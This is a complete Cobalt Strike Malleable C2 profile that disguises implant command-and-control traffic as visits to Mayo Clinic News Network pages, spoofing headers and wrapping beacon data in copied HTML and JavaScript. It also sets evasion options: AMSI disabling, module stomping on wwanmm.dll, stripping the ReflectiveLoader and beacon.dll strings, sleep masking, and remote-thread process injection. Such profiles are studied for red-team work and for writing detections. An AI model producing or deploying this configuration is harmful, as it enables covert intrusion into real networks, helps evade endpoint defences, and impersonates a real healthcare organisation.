#mayoclinic profile
#xx0hcd 
  
set sleeptime "37000"; 
set jitter    "25"; 
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"; 
set dns_idle "8.8.8.8"; 
set maxdns    "245"; 
  
set sample_name "mayoclinic.profile"; 
  
#https-certificate { 
#        set keystore "keystore.store"; 
#        set password "password"; 
#} 
  
http-config { 
    set headers "Content-Type, Connection, Server, Link, X-Cache"; 
    header "Content-Type" "text/html;charset=UTF-8"; 
    header "Connection" "close"; 
    header "Server" "nginx"; 
    header "X-Powered-By" "PHP/7.0.33"; 
    header "Link" "<https://newsnetwork.mayoclinic.org/wp-json/>; rel=\"https://api.w.org/\"";
    set trust_x_forwarded_for "false";
} 
  
http-get { 
  
    set uri "/discussion/mayo-clinic-radio-als/ /discussion/ /hubcap/mayo-clinic-radio-full-shows/ /category/research-2/"; 
     
    client { 
  
    header "Host" "www.mayomedical.com"; 
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"; 
    header "Accept-Language" "en-US,en;q=0.5"; 
    header "Connection" "close"; 
  
    parameter "permalink" "https://www.mayoclinic.org"; 
        
        metadata { 
            netbios; 
         parameter "id"; 
  
        } 
  
    } 
  
    server { 
         
        output { 
  
            base64;         
        
        prepend "type=\"text/javascript\">(window.NREUM||(NREUM={})).loader_config={xpid:"; 
        prepend "<script\n"; 
        prepend "        <meta charset=\"UTF-8\">\n"; 
        prepend "    <head>\n"; 
        prepend "<html lang=\"en-US\">\n"; 
        prepend "<!DOCTYPE html>\n"; 
  
        append "};window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if(\"function\"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t(\"ee\"),a=t(16),s={};try{o=localStorage.getItem(\"__nr_flags\").split(\",\"),console&&\"function\"==typeof console.log&&(s.console=!0,o.indexOf(\"dev\")!==-1&&(s.dev=!0),o.indexOf(\"nr_dev\")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on(\"internal-error\",function(t){r(t.stack)}),s.dev&&i.on(\"fn-err\",function(t,n,e){r(e.stack)}),s.dev&&(r(\"NR AGENT IN DEVELOPMENT MODE\"),r(\"flags: \"+a(s,function(t,n){return t}).join(\", \")))},{}],2:[function(t,n,e){function r(t,n,e,r,s)\n"; 
        append "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"; 
        append "<link rel=\"profile\" href=\"http://gmpg.org/xfn/11\">\n"; 
        append "<link rel=\"pingback\" href=\"https://newsnetwork.mayoclinic.org/xmlrpc.php\">\n"; 
        append "<type=\"text/css\" media=\"screen\" />\n"; 
        append "<title>Research &#8211; Mayo Clinic News Network</title>\n"; 
        append "</script>\n"; 
        append "</html><!--Partial cache version delivered by HubScale -->"; 
            print; 
        } 
    } 
} 
  
http-post { 
     
    set uri "/archive/ /bloglist/ /secondary-archive/ "; 
    set verb "GET"; 
  
    client { 
  
    header "Host" "www.mayomedical.com"; 
    header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"; 
    header "Accept-Language" "en-US,en;q=0.5"; 
    header "Connection" "close";     
         
        output { 
            base64url; 
        parameter "permalink"; 
        } 
  
  
        id { 
        netbios; 
        parameter "id";         
  
        } 
    } 
  
    server { 
  
        output { 
            base64;         
        
        prepend "type=\"text/javascript\">(window.NREUM||(NREUM={})).loader_config={xpid:"; 
        prepend "<script\n"; 
        prepend "        <meta charset=\"UTF-8\">\n"; 
        prepend "    <head>\n"; 
        prepend "<html lang=\"en-US\">\n"; 
        prepend "<!DOCTYPE html>\n"; 
  
        append "\"VgYBUVZWDRAJXVlTAQUAVw==\"};window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if(\"function\"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t(\"ee\"),a=t(16),s={};try{o=localStorage.getItem(\"__nr_flags\").split(\",\"),console&&\"function\"==typeof console.log&&(s.console=!0,o.indexOf(\"dev\")!==-1&&(s.dev=!0),o.indexOf(\"nr_dev\")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on(\"internal-error\",function(t){r(t.stack)}),s.dev&&i.on(\"fn-err\",function(t,n,e){r(e.stack)}),s.dev&&(r(\"NR AGENT IN DEVELOPMENT MODE\"),r(\"flags: \"+a(s,function(t,n){return t}).join(\", \")))},{}],2:[function(t,n,e){function r(t,n,e,r,s)\n"; 
        append "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"; 
        append "<link rel=\"profile\" href=\"http://gmpg.org/xfn/11\">\n"; 
        append "<link rel=\"pingback\" href=\"https://newsnetwork.mayoclinic.org/xmlrpc.php\">\n"; 
        append "<type=\"text/css\" media=\"screen\" />\n"; 
        append "<title>Research &#8211; Mayo Clinic News Network</title>\n"; 
        append "</script>\n"; 
        append "</html><!--Partial cache version delivered by HubScale -->"; 
            print; 
        } 
    } 
} 
  
http-stager { 
  
    set uri_x86 "/tag/"; 
    set uri_x64 "/Category/"; 
  
    client { 
    header "Host" "www.mayomedical.com"; 
    header "Accept" "*/*"; 
    header "Accept-Language" "en-US"; 
    header "Connection" "close"; 
    } 
  
    server { 
     
    } 
  
  
} 
  
###Malleable PE Options### 
#always test spawnto and module stomp before using. My examples tested on Windows 10 Pro. 
  
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";

}
  
#used peclone on wwanmm.dll.  
#don't use 'set image_size_xx' if using 'set module_xx' 
stage { 
    set checksum       "0"; 
    set compile_time   "25 Oct 2016 01:57:23"; 
    set entry_point    "170000"; 
#    set image_size_x86 "6586368"; 
#    set image_size_x64 "6586368"; 
#    set name       "WWanMM.dll"; 
    set userwx        "false"; 
    set cleanup       "true"; 
    set sleep_mask       "true"; 
    set stomppe       "true"; 
    set obfuscate       "true"; 
    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
  
  
#module stomp 
  
    set module_x86 "wwanmm.dll"; 
    set module_x64 "wwanmm.dll"; 
  
    transform-x86 { 
        prepend "\x90\x90\x90"; 
        strrep "ReflectiveLoader" ""; 
        strrep "beacon.dll" ""; 
    } 
  
    transform-x64 { 
        prepend "\x90\x90\x90"; 
        strrep "ReflectiveLoader" ""; 
        strrep "beacon.x64.dll" ""; 
    }
}
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
} 
